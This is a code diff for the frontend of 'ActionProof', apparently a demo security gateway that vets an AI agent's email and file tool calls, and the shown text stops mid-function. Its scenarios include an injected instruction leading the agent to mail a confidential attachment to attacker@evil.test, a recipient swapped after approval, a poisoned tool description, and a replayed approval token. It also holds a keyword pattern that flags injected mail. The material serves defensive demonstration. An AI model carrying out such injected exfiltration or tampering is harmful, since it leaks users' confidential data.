@@ -1,425 +1,681 @@
-// ─── Constants & scenario definitions ────────────────────────────────────────
+// ═══════════════════════════════════════════════════════════════════
+//  ActionProof — Frontend
+//  Three.js background · GSAP animations · D3 transaction graph
+// ═══════════════════════════════════════════════════════════════════
+
 const API = '/v1';
-const scenarios = {
-  safe: {
-    server_id: 'mock-email-v1', tool_name: 'send_email',
-    arguments: { to: 'alice@company.test', subject: 'Q4 report', body: 'Please review the attached report.', attachment: 'meeting_notes.pdf' }
-  },
-  exfil: {
-    server_id: 'mock-email-v1', tool_name: 'send_email',
-    arguments: { to: 'attacker@evil.test', subject: 'Q4 report', body: 'Please review the attached report.', attachment: 'confidential_q4.pdf' }
-  },
-  tamper: {
-    server_id: 'mock-email-v1', tool_name: 'send_email',
-    arguments: { to: 'alice@partner.test', subject: 'Meeting notes', body: 'Please review the attached meeting notes.', attachment: 'meeting_notes.pdf' }
-  },
-  registry: null,  // handled entirely by its own panel buttons
-  replay: null,    // handled entirely by its own panel button
-};
+const $  = id => document.getElementById(id);
 
-// ─── State ────────────────────────────────────────────────────────────────────
-let active = null;
-let approvalToken = null;
-
-// ─── Helpers ─────────────────────────────────────────────────────────────────
-const $ = s => document.querySelector(s);
-
-async function request(path, options = {}) {
-  const r = await fetch(API + path, { headers: { 'Content-Type': 'application/json' }, ...options });
+// ── API ───────────────────────────────────────────────────────────
+async function api(method, path, body) {
+  const opts = { method, headers: { 'Content-Type': 'application/json' } };
+  if (body) opts.body = JSON.stringify(body);
+  const r = await fetch(API + path, opts);
   const data = await r.json();
-  if (!r.ok) throw { status: r.status, detail: data.detail };
+  if (!r.ok) throw data;
   return data;
 }
 
-function setState(kind, text, explanation) {
-  const e = $('#state');
-  e.className = 'state ' + kind;
-  e.querySelector('span').textContent = text;
-  $('#explanation').textContent = explanation;
-}
+// ═══════════════════════════════════════════════════════════════════
+//  THREE.JS — Particle network background
+// ═══════════════════════════════════════════════════════════════════
+(function initThree() {
+  const canvas = $('bg-canvas');
+  const renderer = new THREE.WebGLRenderer({ canvas, alpha: true, antialias: true });
+  renderer.setPixelRatio(Math.min(window.devicePixelRatio, 2));
 
-function steps(marked, blocked = false) {
-  [...$('#steps').children].forEach((x, i) =>
-    x.className = i < marked ? 'done' : (blocked && i === marked ? 'blocked' : '')
+  const scene = new THREE.Scene();
+  const camera = new THREE.PerspectiveCamera(60, 1, 0.1, 1000);
+  camera.position.z = 80;
+
+  // Particles
+  const COUNT = 120;
+  const positions = new Float32Array(COUNT * 3);
+  const velocities = [];
+  for (let i = 0; i < COUNT; i++) {
+    positions[i * 3]     = (Math.random() - 0.5) * 160;
+    positions[i * 3 + 1] = (Math.random() - 0.5) * 100;
+    positions[i * 3 + 2] = (Math.random() - 0.5) * 40;
+    velocities.push({
+      x: (Math.random() - 0.5) * 0.04,
+      y: (Math.random() - 0.5) * 0.04,
+      z: (Math.random() - 0.5) * 0.01,
+    });
+  }
+
+  const geo = new THREE.BufferGeometry();
+  geo.setAttribute('position', new THREE.BufferAttribute(positions, 3));
+
+  const mat = new THREE.PointsMaterial({ color: 0x1a3a6b, size: 1.2, transparent: true, opacity: 0.7 });
+  const points = new THREE.Points(geo, mat);
+  scene.add(points);
+
+  // Connection lines
+  const linePositions = new Float32Array(COUNT * COUNT * 6);
+  const lineGeo = new THREE.BufferGeometry();
+  lineGeo.setAttribute('position', new THREE.BufferAttribute(linePositions, 3));
+  const lineMat = new THREE.LineSegments(
+    lineGeo,
+    new THREE.LineBasicMaterial({ color: 0x1a3a6b, transparent: true, opacity: 0.15 })
   );
-}
+  scene.add(lineMat);
 
-function short(f) { return f ? f.slice(0, 13) + '…' + f.slice(-6) : ''; }
-
-function showReview(tx) {
-  $('#review-empty').hidden = true;
-  $('#review').hidden = false;
-  $('#review-to').textContent = tx.approval_request.arguments.to;
-  $('#review-subject').textContent = tx.approval_request.arguments.subject;
-  $('#review-attachment').textContent = tx.approval_request.arguments.attachment;
-  $('#review-fingerprint').textContent = short(tx.fingerprint);
-}
-
-function clearReview() {
-  $('#review-empty').hidden = false;
-  $('#review').hidden = true;
-}
-
-function resetApproveButton() {
-  const btn = $('#approve');
-  btn.textContent = 'Approve exact action';
-  btn.onclick = approve;
-  btn.disabled = false;
-  $('#reject').disabled = false;
-}
-
-async function refreshMailbox() {
-  try {
-    const x = await request('/mailbox/sent');
-    $('#mail-count').textContent = `${x.messages.length} message${x.messages.length === 1 ? '' : 's'}`;
-    $('#mailbox').innerHTML = x.messages.length
-      ? x.messages.map(m => `<div class="mail"><b>To: ${m.to}</b>${m.subject} · ${m.attachment}</div>`).join('')
-      : 'No simulated messages sent yet.';
-    return x.messages.length;
-  } catch {
-    $('#mailbox').textContent = 'Start the simulated Email MCP server to view the mailbox.';
-    return 0;
-  }
-}
-
-async function loadAudit() {
-  if (!active) return;
-  const x = await request(`/transactions/${active.id}/audit`);
-  $('#audit').innerHTML = x.events.map(e =>
-    `<li><b>${e.event_type}</b><span>${e.message}</span></li>`
-  ).join('');
-}
-
-function hideAllExtraPanels() {
-  $('#injection-panel').hidden = true;
-  $('#registry-panel').hidden = true;
-  $('#replay-panel').hidden = true;
-  $('#diff-panel').hidden = true;
-}
-
-// ─── Standard scenario runner (01, 02, 03) ───────────────────────────────────
-async function run(which) {
-  hideAllExtraPanels();
-  clearReview();
-  resetApproveButton();
-  approvalToken = null;
-  const invocation = scenarios[which];
-  setState('neutral', 'Proposing action…', 'The agent request is being checked before the simulated tool can receive it.');
-  steps(1);
-
-  // Show prompt injection narrative for exfil scenario before proposing
-  if (which === 'exfil') {
-    $('#injection-panel').hidden = false;
-    $('#inj-verdict').textContent = 'Evaluating…';
-    $('#inj-verdict').className = 'inj-verdict';
-    $('#inj-result-label').className = 'inj-label';
-  }
-
-  try {
-    const tx = await request('/transactions/propose', { method: 'POST', body: JSON.stringify(invocation) });
-    active = { id: tx.transaction_id, invocation, scenario: which, tx };
-    await loadAudit();
-
-    if (tx.decision === 'ALLOW') {
-      setState('safe', 'Policy allowed exact action', 'Internal, non-sensitive communication is permitted. Executing the exact proposed request.');
-      steps(2);
-      await request(`/transactions/${active.id}/execute`, { method: 'POST', body: JSON.stringify({ invocation }) });
-      setState('safe', 'Verified and executed', 'The gateway checked the exact action and the simulated email server accepted it.');
-      steps(4);
-      await loadAudit();
-      await refreshMailbox();
-
-    } else if (tx.decision === 'DENY') {
-      setState('danger', 'Blocked before execution', 'The protected attachment may not leave the approved domain. No email was sent.');
-      steps(2, true);
-      await refreshMailbox();
-
-      if (which === 'exfil') {
-        $('#inj-verdict').textContent = 'DENIED — P-DENY-001: Protected attachment may not leave approved domain. The injected instruction was never executed.';
-        $('#inj-verdict').className = 'inj-verdict blocked-verdict';
-        $('#inj-result-label').className = 'inj-label blocked-label';
-      }
-
-    } else {
-      // REQUIRE_APPROVAL
-      setState('approval', 'Awaiting your exact approval', 'External communication can proceed only if you approve these immutable details.');
-      steps(2);
-      showReview(tx);
-    }
-  } catch (e) {
-    setState('danger', 'Service unavailable', e.detail?.message || 'Start both local services and try again.');
-  }
-}
-
-// ─── Approval flow ────────────────────────────────────────────────────────────
-async function approve() {
-  if (!active) return;
-  try {
-    const x = await request(`/transactions/${active.id}/approve`, { method: 'POST' });
-    approvalToken = x.token;
-    setState('approval', 'Approved once', 'The approval is bound to this fingerprint and expires at ' + new Date(x.expires_at).toLocaleTimeString() + '.');
-    steps(3);
-    await loadAudit();
-
-    if (active.scenario === 'tamper') {
-      $('#approve').textContent = 'Attempt altered execution';
-      $('#approve').onclick = attemptTamper;
-    }
-  } catch (e) {
-    setState('danger', 'Approval failed', e.detail?.message || 'Could not approve this action.');
-  }
-}
-
-async function attemptTamper() {
-  const altered = structuredClone(active.invocation);
-  altered.arguments.to = 'attacker@evil.test';
-  try {
-    await request(`/transactions/${active.id}/execute`, { method: 'POST', body: JSON.stringify({ invocation: altered, approval_token: approvalToken }) });
-  } catch (e) {
-    const count = await refreshMailbox();
-    setState('danger', 'Blocked — approval mismatch', 'The attempted recipient differs from the recipient you approved. Nothing reached the email server.');
-    steps(3, true);
-    $('#approved-to').textContent = active.invocation.arguments.to;
-    $('#attempted-to').textContent = altered.arguments.to;
-    $('#unauthorized').textContent = count;
-    $('#diff-panel').hidden = false;
-    await loadAudit();
-    $('#approve').disabled = true;
-    $('#reject').disabled = true;
-  }
-}
-
-// ─── Reset ────────────────────────────────────────────────────────────────────
-async function reset() {
-  try { await request('/demo/reset', { method: 'POST' }); } catch { }
-  active = null;
-  approvalToken = null;
-  clearReview();
-  hideAllExtraPanels();
-  resetApproveButton();
-  setState('neutral', 'Ready for a controlled scenario', 'The agent can propose an action. ActionProof independently decides whether it can execute.');
-  steps(0);
-  $('#audit').innerHTML = '<li><b>STANDBY</b><span>Nothing has executed.</span></li>';
-  await refreshMailbox();
-  // Reset registry panel state too
-  await loadRegistryStatus();
-}
-
-// ─── Scenario 04: Tool definition registry ───────────────────────────────────
-async function loadRegistryStatus() {
-  try {
-    const s = await request('/registry/status');
-    $('#reg-approved-hash').textContent = s.approved_hash.slice(0, 32) + '…';
-    $('#reg-current-hash').textContent = s.current_hash.slice(0, 32) + '…';
-    $('#reg-approved-desc').textContent = '"Send a message through the simulated email service."';
-
-    if (s.tampered) {
-      $('#reg-current-box').className = 'reg-box current tampered';
-      $('#reg-current-desc').textContent = `"${s.current_description}"`;
-      $('#reg-verdict').textContent = '⚠ REGISTRY DRIFT DETECTED — the pinned hash no longer matches the approved definition. All tool calls will be blocked until re-approved.';
-      $('#reg-verdict').className = 'reg-verdict danger-verdict';
-      $('#btn-tamper').disabled = true;
-      $('#btn-restore').disabled = false;
-      $('#btn-propose-after-tamper').disabled = false;
-    } else {
-      $('#reg-current-box').className = 'reg-box current';
-      $('#reg-current-desc').textContent = '"Send a message through the simulated email service."';
-      $('#reg-verdict').textContent = '✓ Registry intact — current definition matches the approved pinned hash.';
-      $('#reg-verdict').className = 'reg-verdict safe-verdict';
-      $('#btn-tamper').disabled = false;
-      $('#btn-restore').disabled = true;
-      $('#btn-propose-after-tamper').disabled = true;
-    }
-  } catch {
-    $('#reg-verdict').textContent = 'Could not load registry status. Is the gateway running?';
-  }
-}
-
-function showRegistryScenario() {
-  hideAllExtraPanels();
-  clearReview();
-  resetApproveButton();
-  active = null;
-  approvalToken = null;
-  setState('neutral', 'Tool Registry Integrity Check', 'Scenario 04 uses the registry panel below. Tamper the definition, then attempt to use the tool.');
-  steps(0);
-  $('#audit').innerHTML = '<li><b>STANDBY</b><span>No transaction yet.</span></li>';
-  $('#registry-panel').hidden = false;
-  loadRegistryStatus();
-  refreshMailbox();
-}
-
-$('#btn-tamper') && ($('#btn-tamper').onclick = async () => {
-  await request('/registry/tamper', { method: 'POST' });
-  await loadRegistryStatus();
-  setState('danger', 'Tool definition poisoned', 'An attacker has modified the downstream tool description to inject malicious instructions. ActionProof detects the hash mismatch.');
-});
-
-$('#btn-restore') && ($('#btn-restore').onclick = async () => {
-  await request('/registry/restore', { method: 'POST' });
-  await loadRegistryStatus();
-  setState('neutral', 'Definition restored', 'The tool definition is back to its approved version. The registry is clean.');
-});
-
-$('#btn-propose-after-tamper') && ($('#btn-propose-after-tamper').onclick = async () => {
-  const invocation = scenarios.tamper;
-  setState('neutral', 'Proposing action with drifted registry…', 'Attempting to use a tool whose definition has changed since it was pinned.');
-  steps(1);
-  try {
-    const tx = await request('/transactions/propose', { method: 'POST', body: JSON.stringify(invocation) });
-    // Should not reach here if drift is detected
-    active = { id: tx.transaction_id, invocation, scenario: 'registry', tx };
-    await loadAudit();
-    setState('approval', 'Unexpected: proposal accepted', 'The drift check may not have triggered. Check registry status.');
-  } catch (e) {
-    const code = e.detail?.code || 'ERROR';
-    const msg = e.detail?.message || 'Unknown error';
-    if (code === 'REGISTRY_DRIFT') {
-      setState('danger', 'Blocked — registry drift', msg);
-      steps(1, true);
-      $('#audit').innerHTML = `<li><b>REGISTRY_DRIFT</b><span>${msg}</span></li>`;
-    } else {
-      setState('danger', 'Blocked', msg);
-      steps(1, true);
-    }
-    await refreshMailbox();
-  }
-});
-
-// ─── Scenario 05: Token replay ────────────────────────────────────────────────
-function showReplayScenario() {
-  hideAllExtraPanels();
-  clearReview();
-  resetApproveButton();
-  active = null;
-  approvalToken = null;
-  setState('neutral', 'Token Replay Protection', 'Scenario 05 runs automatically. Watch the approval token be consumed on first use, then blocked on second.');
-  steps(0);
-  $('#audit').innerHTML = '<li><b>STANDBY</b><span>No transaction yet.</span></li>';
-  $('#replay-panel').hidden = false;
-  // Reset step indicators
-  ['rpl-s1', 'rpl-s2', 'rpl-s3', 'rpl-s4'].forEach(id => { $(('#' + id)).textContent = '—'; $(('#' + id)).className = 'rpl-status'; });
-  $('#replay-result').hidden = true;
-  $('#btn-replay-run').disabled = false;
-  refreshMailbox();
-}
-
-$('#btn-replay-run') && ($('#btn-replay-run').onclick = runReplaySequence);
-
-async function runReplaySequence() {
-  $('#btn-replay-run').disabled = true;
-  const invocation = scenarios.tamper; // partner email — requires approval
-
-  function rplStatus(id, text, kind) {
-    const el = $('#' + id);
-    el.textContent = text;
-    el.className = 'rpl-status rpl-' + kind;
-  }
-
-  // Step 1: Propose
-  rplStatus('rpl-s1', 'Running…', 'running');
-  setState('neutral', 'Step 1 — Proposing action…', 'The agent proposes an email that requires user approval.');
-  steps(1);
-  let tx;
-  try {
-    tx = await request('/transactions/propose', { method: 'POST', body: JSON.stringify(invocation) });
-    active = { id: tx.transaction_id, invocation, scenario: 'replay', tx };
-    rplStatus('rpl-s1', '✓ AWAITING_APPROVAL', 'ok');
-    await loadAudit();
-  } catch (e) {
-    rplStatus('rpl-s1', '✗ Failed', 'fail');
-    setState('danger', 'Propose failed', e.detail?.message || 'Could not propose transaction.');
-    return;
-  }
-
-  // Step 2: Approve
-  rplStatus('rpl-s2', 'Running…', 'running');
-  setState('approval', 'Step 2 — Issuing approval token…', 'A one-use HMAC token is issued and bound to this exact fingerprint.');
-  steps(3);
-  let token;
-  try {
-    const ap = await request(`/transactions/${tx.transaction_id}/approve`, { method: 'POST' });
-    token = ap.token;
-    rplStatus('rpl-s2', '✓ Token issued', 'ok');
-    await loadAudit();
-  } catch (e) {
-    rplStatus('rpl-s2', '✗ Failed', 'fail');
-    setState('danger', 'Approve failed', e.detail?.message || 'Could not approve transaction.');
-    return;
-  }
-
-  // Step 3: First execution (should succeed)
-  rplStatus('rpl-s3', 'Running…', 'running');
-  setState('safe', 'Step 3 — First execution…', 'Using the token for the first time. This should succeed.');
-  try {
-    await request(`/transactions/${tx.transaction_id}/execute`, { method: 'POST', body: JSON.stringify({ invocation, approval_token: token }) });
-    rplStatus('rpl-s3', '✓ EXECUTED', 'ok');
-    await loadAudit();
-    await refreshMailbox();
-  } catch (e) {
-    rplStatus('rpl-s3', '✗ Failed', 'fail');
-    setState('danger', 'First execution failed', e.detail?.message || 'Unexpected failure on first use.');
-    return;
-  }
-
-  // Step 4: Replay attempt (must be blocked)
-  rplStatus('rpl-s4', 'Running…', 'running');
-  setState('approval', 'Step 4 — Replaying the same token…', 'The agent tries to reuse the already-consumed token.');
-
-  // We need a fresh transaction to replay against (the first is EXECUTED/terminal)
-  // Create a second transaction and try to use the first token against it
-  let tx2;
-  try {
-    tx2 = await request('/transactions/propose', { method: 'POST', body: JSON.stringify(invocation) });
-    await request(`/transactions/${tx2.transaction_id}/approve`, { method: 'POST' });
-    // Now attempt to execute tx2 with the OLD token from tx (wrong transaction)
-    await request(`/transactions/${tx2.transaction_id}/execute`, { method: 'POST', body: JSON.stringify({ invocation, approval_token: token }) });
-    // If we reach here, replay was not blocked
-    rplStatus('rpl-s4', '✗ NOT BLOCKED', 'fail');
-    setState('danger', 'Replay was not blocked', 'The gateway accepted a reused token. This is a failure.');
-  } catch (e) {
-    const code = e.detail?.code || '';
-    if (code === 'WRONG_TRANSACTION' || code === 'TOKEN_REPLAY' || code === 'INVALID_TOKEN') {
-      rplStatus('rpl-s4', '✓ BLOCKED — ' + code, 'ok');
-      setState('danger', 'Replay blocked — ' + code, 'The token was already consumed or belongs to a different transaction. Zero additional emails delivered.');
-      steps(3, true);
-      await loadAudit();
-      const count = await refreshMailbox();
-      const result = $('#replay-result');
-      result.hidden = false;
-      result.className = 'replay-result success-result';
-      result.innerHTML = `<b>✓ Single-use enforcement confirmed.</b> Token from transaction <code>${tx.transaction_id.slice(-8)}</code> was rejected on second use (code: <code>${code}</code>). Total emails in mailbox: <b>${count}</b> (only the legitimate first use).`;
-    } else {
-      rplStatus('rpl-s4', '✗ ' + (e.detail?.message || 'Error'), 'fail');
-      setState('danger', 'Unexpected error', e.detail?.message || 'Unknown failure.');
-    }
-  }
-}
-
-// ─── Wire up scenario buttons ─────────────────────────────────────────────────
-document.querySelectorAll('.scenario').forEach(b => {
-  b.onclick = () => {
-    const which = b.dataset.scenario;
-    if (which === 'registry') {
-      showRegistryScenario();
-    } else if (which === 'replay') {
-      showReplayScenario();
-    } else {
-      run(which);
-    }
+  // Flash effect — called when a gateway event fires
+  window.bgFlash = function(color) {
+    const hex = color === 'red' ? 0x5a1e1b : color === 'green' ? 0x1a4731 : 0x5a3e0a;
+    gsap.to(mat, { opacity: 1, duration: 0.1, yoyo: true, repeat: 1,
+      onUpdate: () => { mat.color.setHex(hex); },
+      onComplete: () => { mat.color.setHex(0x1a3a6b); mat.opacity = 0.7; }
+    });
   };
+
+  function resize() {
+    const w = canvas.clientWidth, h = canvas.clientHeight;
+    renderer.setSize(w, h, false);
+    camera.aspect = w / h;
+    camera.updateProjectionMatrix();
+  }
+  resize();
+  window.addEventListener('resize', resize);
+
+  let frame = 0;
+  (function animate() {
+    requestAnimationFrame(animate);
+    frame++;
+    const pos = geo.attributes.position.array;
+    for (let i = 0; i < COUNT; i++) {
+      pos[i*3]   += velocities[i].x;
+      pos[i*3+1] += velocities[i].y;
+      pos[i*3+2] += velocities[i].z;
+      if (Math.abs(pos[i*3])   > 80) velocities[i].x *= -1;
+      if (Math.abs(pos[i*3+1]) > 50) velocities[i].y *= -1;
+      if (Math.abs(pos[i*3+2]) > 20) velocities[i].z *= -1;
+    }
+    geo.attributes.position.needsUpdate = true;
+
+    // Update lines every 3 frames for performance
+    if (frame % 3 === 0) {
+      let lIdx = 0;
+      const lp = lineGeo.attributes.position.array;
+      for (let a = 0; a < COUNT; a++) {
+        for (let b = a + 1; b < COUNT; b++) {
+          const dx = pos[a*3]-pos[b*3], dy = pos[a*3+1]-pos[b*3+1];
+          const dist = Math.sqrt(dx*dx + dy*dy);
+          if (dist < 22 && lIdx + 6 <= lp.length) {
+            lp[lIdx++]=pos[a*3]; lp[lIdx++]=pos[a*3+1]; lp[lIdx++]=pos[a*3+2];
+            lp[lIdx++]=pos[b*3]; lp[lIdx++]=pos[b*3+1]; lp[lIdx++]=pos[b*3+2];
+          }
+        }
+      }
+      // zero out rest
+      for (; lIdx < lp.length; lIdx++) lp[lIdx] = 0;
+      lineGeo.attributes.position.needsUpdate = true;
+      lineGeo.setDrawRange(0, lIdx / 3);
+    }
+
+    points.rotation.y += 0.0004;
+    renderer.render(scene, camera);
+  })();
+})();
+
+// ═══════════════════════════════════════════════════════════════════
+//  D3 — Live transaction graph strip
+// ═══════════════════════════════════════════════════════════════════
+const txNodes = [];   // { id, decision, x, label }
+const TX_COLORS = { ALLOW:'#3fb950', DENY:'#f85149', REQUIRE_APPROVAL:'#d29922',
+                    BLOCKED:'#f85149', EXECUTED:'#3fb950', REJECTED:'#8b949e' };
+
+function d3AddNode(decision, label) {
+  const svg = d3.select('#tx-graph');
+  const W = document.getElementById('tx-graph').clientWidth || 800;
+  const NODE_R = 10;
+  const spacing = 28;
+  const id = `tx-${Date.now()}`;
+
+  // Shift all existing nodes left
+  txNodes.forEach(n => { n.x -= spacing; });
+  // Remove nodes that scrolled off
+  txNodes.splice(0, txNodes.filter(n => n.x < -20).length);
+  // Add new node on right
+  txNodes.push({ id, decision, x: W - 20, label });
+
+  // Rebind
+  const groups = svg.selectAll('g.tx-node').data(txNodes, d => d.id);
+
+  const enter = groups.enter().append('g').attr('class', 'tx-node')
+    .attr('transform', d => `translate(${d.x}, 24)`);
+
+  enter.append('circle')
+    .attr('r', 0)
+    .attr('fill', d => TX_COLORS[d.decision] || '#8b949e')
+    .attr('stroke', '#0d1117').attr('stroke-width', 2)
+    .attr('opacity', 0.9)
+    .transition().duration(300).attr('r', NODE_R);
+
+  enter.append('text')
+    .attr('y', NODE_R + 11)
+    .attr('text-anchor', 'middle')
+    .attr('fill', '#8b949e')
+    .attr('font-size', '8px')
+    .attr('font-family', 'DM Mono, monospace')
+    .text(d => d.label);
+
+  // Update existing
+  groups.transition().duration(200)
+    .attr('transform', d => `translate(${d.x}, 24)`);
+
+  groups.exit().select('circle').transition().duration(200).attr('r', 0).end()
+    .then(() => groups.exit().remove()).catch(() => {});
+
+  // Draw connecting line
+  if (txNodes.length > 1) {
+    const lineData = txNodes.map(n => ({ x: n.x, y: 24 }));
+    const line = d3.line().x(d => d.x).y(d => d.y).curve(d3.curveMonotoneX);
+    svg.selectAll('path.tx-line').remove();
+    svg.insert('path', ':first-child')
+      .attr('class', 'tx-line')
+      .attr('d', line(lineData))
+      .attr('fill', 'none')
+      .attr('stroke', '#30363d')
+      .attr('stroke-width', 1)
+      .attr('opacity', 0.5);
+  }
+}
+
+// ═══════════════════════════════════════════════════════════════════
+//  State
+// ═══════════════════════════════════════════════════════════════════
+let txCount = 0, sentCount = 0, running = false, pendingApproval = null;
+let stats = { blocked: 0, allowed: 0, pending: 0 };
+
+function updateStats(decision) {
+  if (decision === 'ALLOW' || decision === 'EXECUTED') stats.allowed++;
+  else if (decision === 'DENY' || decision === 'BLOCKED') stats.blocked++;
+  else if (decision === 'REQUIRE_APPROVAL') stats.pending++;
+  gsap.to($('stat-blocked'), { textContent: stats.blocked, snap: { textContent: 1 }, duration: .4 });
+  gsap.to($('stat-allowed'), { textContent: stats.allowed, snap: { textContent: 1 }, duration: .4 });
+  gsap.to($('stat-pending'), { textContent: stats.pending, snap: { textContent: 1 }, duration: .4 });
+}
+
+// ── Gateway badge ─────────────────────────────────────────────────
+function setBadge(state, text) {
+  const b = $('gateway-badge');
+  gsap.to(b, { opacity: 0, duration: .1, onComplete: () => {
+    b.className = 'gateway-badge ' + state;
+    $('gateway-status-text').textContent = text;
+    gsap.to(b, { opacity: 1, duration: .2 });
+  }});
+}
+
+// ═══════════════════════════════════════════════════════════════════
+//  GSAP helpers
+// ═══════════════════════════════════════════════════════════════════
+function animateIn(el, color) {
+  gsap.set(el, { opacity: 0, y: -10, scale: .97 });
+  gsap.to(el, { opacity: 1, y: 0, scale: 1, duration: .25, ease: 'power2.out' });
+  if (color) window.bgFlash && window.bgFlash(color);
+}
+
+function shakeEl(el) {
+  gsap.timeline()
+    .to(el, { x: -6, duration: .06 })
+    .to(el, { x:  6, duration: .06 })
+    .to(el, { x: -4, duration: .05 })
+    .to(el, { x:  4, duration: .05 })
+    .to(el, { x:  0, duration: .05 });
+}
+
+function tickCounter(id) {
+  const el = $(id);
+  gsap.from(el, { opacity: 0.3, duration: .3 });
+}
+
+// ═══════════════════════════════════════════════════════════════════
+//  DOM helpers
+// ═══════════════════════════════════════════════════════════════════
+function el(tag, cls, html) {
+  const e = document.createElement(tag);
+  if (cls) e.className = cls;
+  if (html) e.innerHTML = html;
+  return e;
+}
+
+function prepend(parent, child) {
+  parent.insertBefore(child, parent.firstChild);
+}
+
+function setIdle(id, text) {
+  $(id).innerHTML = `<div class="feed-idle">${text}</div>`;
+}
+
+// ═══════════════════════════════════════════════════════════════════
+//  Inbox
+// ═══════════════════════════════════════════════════════════════════
+async function loadInbox() {
+  try {
+    const data = await api('GET', '/inbox');
+    const list = $('inbox-list');
+    if (!data.messages.length) { list.innerHTML = '<div class="inbox-empty">No messages.</div>'; return; }
+    list.innerHTML = '';
+    data.messages.forEach((m, i) => {
+      const dangerous = m.body && (m.body.includes('SEND:') || m.body.includes('URGENT'));
+      const item = el('div', `inbox-item ${dangerous ? 'inbox-danger' : ''}`,
+        `<div class="inbox-from">${m.from || m.from_address || '?'}</div>
+         <div class="inbox-subject">${m.subject}</div>
+         ${m.attachment ? `<div class="inbox-attach">📎 ${m.attachment}</div>` : ''}`);
+      list.appendChild(item);
+      gsap.from(item, { opacity: 0, x: -10, duration: .3, delay: i * .08 });
+    });
+  } catch { $('inbox-list').innerHTML = '<div class="inbox-empty">Could not load inbox.</div>'; }
+}
+
+// ═══════════════════════════════════════════════════════════════════
+//  Sent mailbox
+// ═══════════════════════════════════════════════════════════════════
+async function loadSent() {
+  try {
+    const data = await api('GET', '/mailbox/sent');
+    sentCount = data.messages.length;
+    $('sent-count').textContent = sentCount;
+    $('mailbox-count').textContent = `${sentCount} sent`;
+    const feed = $('sent-feed');
+    if (!sentCount) { setIdle('sent-feed', 'No emails delivered yet.'); return; }
+    feed.innerHTML = '';
+    data.messages.forEach(m => {
+      const item = el('div', 'sent-item',
+        `<div class="sent-to">To: <b>${m.to}</b></div>
+         <div class="sent-meta">${m.subject} · 📎 ${m.attachment}</div>`);
+      prepend(feed, item);
+      animateIn(item, 'green');
+    });
+  } catch {}
+}
+
+// ═══════════════════════════════════════════════════════════════════
+//  Agent feed
+// ═══════════════════════════════════════════════════════════════════
+function agentThink(text) {
+  const row = el('div', 'agent-row think-row',
+    `<span class="agent-icon">💭</span><span class="agent-text">${text}</span>`);
+  prepend($('agent-feed'), row);
+  animateIn(row);
+}
+
+function agentToolCall(tool, args) {
+  const argStr = args ? Object.entries(args).map(([k, v]) =>
+    `<div class="arg-row"><span class="arg-key">${k}</span>
+     <span class="arg-val ${k==='to' && String(v).includes('evil') ? 'danger-val' : ''}">${v}</span></div>`
+  ).join('') : '';
+  const row = el('div', 'agent-row tool-row',
+    `<div class="tool-header"><span class="agent-icon">⚙</span><span class="tool-name">${tool}()</span></div>
+     <div class="tool-args">${argStr}</div>`);
+  prepend($('agent-feed'), row);
+  animateIn(row, 'blue');
+}
+
+function agentEmail(msg) {
+  const isInjected = msg.body && (msg.body.includes('SEND:') || msg.body.includes('URGENT'));
+  const bodyPreview = (msg.body || '').slice(0, 160) + ((msg.body||'').length > 160 ? '…' : '');
+  const injMatch = msg.body ? msg.body.match(/SEND:.*?(?=\n|$)/) : null;
+  const row = el('div', `agent-row email-row ${isInjected ? 'email-injected' : ''}`,
+    `<div class="email-meta">
+       <span class="agent-icon">✉</span>
+       <span class="email-from">${msg.from || '?'}</span>
+       <span class="email-subject">${msg.subject}</span>
+     </div>
+     <div class="email-body-preview">${bodyPreview.replace(/\n/g, ' ')}</div>
+     ${isInjected ? `<div class="injected-tag">⚠ INJECTED INSTRUCTION DETECTED<br><code>${injMatch ? injMatch[0] : ''}</code></div>` : ''}
+     ${msg.attachment ? `<div class="email-attach">📎 ${msg.attachment}</div>` : ''}`);
+  prepend($('agent-feed'), row);
+  animateIn(row, isInjected ? 'red' : null);
+}
+
+// ═══════════════════════════════════════════════════════════════════
+//  Filesystem agent events
+// ═══════════════════════════════════════════════════════════════════
+function agentFsList(entries) {
+  if (!entries || !entries.length) return;
+  const LABEL_CLS = { confidential: 'danger-val', internal: 'warn-val', public: 'safe-val' };
+  const rows = entries.map(e =>
+    `<div class="arg-row">
+       <span class="arg-key">${e.name}</span>
+       <span class="arg-val ${LABEL_CLS[e.label] || ''}">${e.label || 'unclassified'}</span>
+     </div>`
+  ).join('');
+  const row = el('div', 'agent-row tool-row',
+    `<div class="tool-header"><span class="agent-icon">📁</span><span class="tool-name">list_directory() result</span></div>
+     <div class="tool-args">${rows}</div>`);
+  prepend($('agent-feed'), row);
+  animateIn(row);
+
+  // Populate filesystem panel in right col
+  const feed = $('fs-feed');
+  feed.innerHTML = '';
+  $('fs-label-count').textContent = `${entries.length} files`;
+  entries.forEach((e, i) => {
+    const cls = e.label === 'confidential' ? 'fs-confidential' : e.label === 'internal' ? 'fs-internal' : 'fs-public';
+    const item = el('div', `fs-item ${cls}`,
+      `<span class="fs-name">📄 ${e.name}</span><span class="fs-label">${e.label || 'unclassified'}</span>`);
+    feed.appendChild(item);
+    gsap.from(item, { opacity: 0, x: 8, duration: .25, delay: i * 0.06 });
+  });
+}
+
+function agentFileRead(data) {
+  const isConf = data.label === 'confidential';
+  const row = el('div', `agent-row ${isConf ? 'email-injected' : 'tool-row'}`,
+    `<div class="tool-header">
+       <span class="agent-icon">${isConf ? '🔒' : '📄'}</span>
+       <span class="tool-name">read_file("${data.path}")</span>
+       <span class="fs-label-badge ${isConf ? 'label-confidential' : 'label-internal'}">${data.label}</span>
+     </div>
+     <div class="file-preview">${(data.preview || '')}…</div>
+     ${isConf ? '<div class="injected-tag">⚠ CONFIDENTIAL label detected — data egress protection active</div>' : ''}`);
+  prepend($('agent-feed'), row);
+  animateIn(row, isConf ? 'red' : null);
+}
+
+// ═══════════════════════════════════════════════════════════════════
+//  Gateway feed
+// ═══════════════════════════════════════════════════════════════════
+function gwDecision(decision, reason, txId, fingerprint) {
+  txCount++;
+  $('tx-count').textContent = `${txCount} transaction${txCount===1?'':'s'}`;
+  tickCounter('tx-count');
+  updateStats(decision);
+  d3AddNode(decision, decision.slice(0,4));
+
+  const cls = { ALLOW:'gw-allow', DENY:'gw-deny', REQUIRE_APPROVAL:'gw-approval',
+                BLOCKED:'gw-block', EXECUTED:'gw-executed', REJECTED:'gw-block' }[decision] || 'gw-block';
+  const icon = (decision==='ALLOW'||decision==='EXECUTED') ? '✓' : decision==='REQUIRE_APPROVAL' ? '◎' : '✗';
+  const row = el('div', `gw-row ${cls}`,
+    `<div class="gw-decision-line">
+       <span class="gw-icon">${icon}</span>
+       <span class="gw-decision">${decision}</span>
